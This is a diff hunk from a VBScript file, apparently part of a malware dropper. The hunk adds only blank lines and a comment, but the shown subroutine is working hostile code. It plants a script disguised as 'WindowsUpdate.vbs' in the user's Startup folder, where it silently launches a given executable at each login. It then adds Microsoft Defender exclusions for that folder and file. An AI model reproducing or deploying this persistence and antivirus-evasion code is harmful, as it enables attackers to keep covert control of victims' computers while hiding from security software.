@@ -99,14 +99,18 @@ Sub CreateStartupFile(exePath)
     Dim startupFolder, startupFile, fileHandle
     startupFolder = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
     If Not fso.FolderExists(startupFolder) Then fso.CreateFolder startupFolder
+    
     startupFile = startupFolder & "\WindowsUpdate.vbs"
+    ' If the file exists, delete it before creating the new one
     If fso.FileExists(startupFile) Then fso.DeleteFile startupFile, True
+    
     Set fileHandle = fso.CreateTextFile(startupFile, True)
     fileHandle.WriteLine "Option Explicit"
     fileHandle.WriteLine "Dim WshShell"
     fileHandle.WriteLine "Set WshShell = CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")"
     fileHandle.WriteLine "WshShell.Run " & Chr(34) & exePath & Chr(34) & ", 0, False"
     fileHandle.Close
+    
     AddDefenderExclusion startupFolder, "folder"
     AddDefenderExclusion startupFile, "process"
 End Sub
